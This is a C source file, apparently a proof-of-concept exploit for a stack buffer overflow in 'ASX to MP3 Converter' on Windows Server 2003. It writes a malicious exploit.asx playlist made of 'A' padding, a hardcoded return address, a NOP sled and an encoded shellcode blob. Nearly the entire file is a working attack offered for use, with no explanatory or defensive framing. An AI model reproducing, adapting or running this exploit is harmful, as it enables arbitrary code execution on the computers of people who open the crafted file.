/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(241);
    char padding[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    memcpy(overwrite_offset, padding, strlen(padding));

    memset(overwrite_offset + _msize(overwrite_offset) - 1, 0x90, 1);

    char retn[] = "\x9d\x78\x03\x10";
    char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
"\xeb\x23\x5b\x89\xdf\xb0\x32\xfc\xae\x75\xfd\x89\xf9\x89\xde"
"\x8a\x06\x30\x07\x47\x66\x81\x3f\x25\x42\x74\x08\x46\x80\x3e"
"\x32\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x27\x32\xdb"
"\xcf\xa5\x27\x27\x27\x47\xae\xc2\x16\xe7\x43\xac\x77\x17\xac"
"\x75\x2b\xac\x75\x33\xac\x55\x0f\x28\x90\x6d\x01\x16\xd8\x8b"
"\x1b\x46\x5b\x25\x0b\x07\xe6\xe8\x2a\x26\xe0\xc5\xd5\x75\x70"
"\xac\x75\x37\xac\x6d\x1b\xac\x6b\x36\x5f\xc4\x6f\x26\xf6\x76"
"\xac\x7e\x07\x26\xf4\xac\x6e\x3f\xc4\x1d\x6e\xac\x13\xac\x26"
"\xf1\x16\xd8\x8b\xe6\xe8\x2a\x26\xe0\x1f\xc7\x52\xd1\x24\x5a"
"\xdf\x1c\x5a\x03\x52\xc3\x7f\xac\x7f\x03\x26\xf4\x41\xac\x2b"
"\x6c\xac\x7f\x3b\x26\xf4\xac\x23\xac\x26\xf7\xae\x63\x03\x03"
"\x7c\x7c\x46\x7e\x7d\x76\xd8\xc7\x78\x78\x7d\xac\x35\xcc\xaa"
"\x7a\x4f\x14\x15\x27\x27\x4f\x50\x54\x15\x78\x73\x4f\x6b\x50"
"\x01\x20\xd8\xf2\x9f\xb7\x26\x27\x27\x0e\xe3\x73\x77\x4f\x0e"
"\xa7\x4c\x27\xd8\xf2\x77\x77\x77\x77\x67\x77\x67\x77\x4f\xcd"
"\x28\xf8\xc7\xd8\xf2\xb0\x4d\x22\x4f\xe7\x8f\x50\xcb\x4f\x25"
"\x27\x26\x9c\xae\xc1\x4d\x37\x71\x70\x4f\xbe\x82\x53\x46\xd8"
"\xf2\xa2\xe7\x53\x2b\xd8\x69\x2f\x52\xcb\x4f\xd7\x92\x85\x71"
"\xd8\xf2\x4f\x44\x4a\x43\x27\xae\xc4\x70\x70\x70\x16\xd1\x4d"
"\x35\x7e\x71\xc5\xda\x41\xe0\x63\x03\x1b\x26\x26\xaa\x63\x03"
"\x37\xe1\x27\x63\x73\x77\x71\x71\x71\x61\x71\x69\x71\x71\x74"
"\x71\x4f\x5e\xeb\x18\xa1\xd8\xf2\xae\xc7\x69\x71\x61\xd8\x17"
"\x4f\x2f\xa0\x3a\x47\xd8\xf2\x9c\xc7\x3a\x0d\x2d\x4f\x81\xb2"
"\x9a\xba\xd8\xf2\x1b\x21\x5b\x2d\xa7\xdc\xc7\x52\x22\x9c\x60"
"\x34\x55\x48\x4d\x27\x74\xd8\xf2\x25\x42\x90";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer);
    fclose(fp);

    return 0;

}
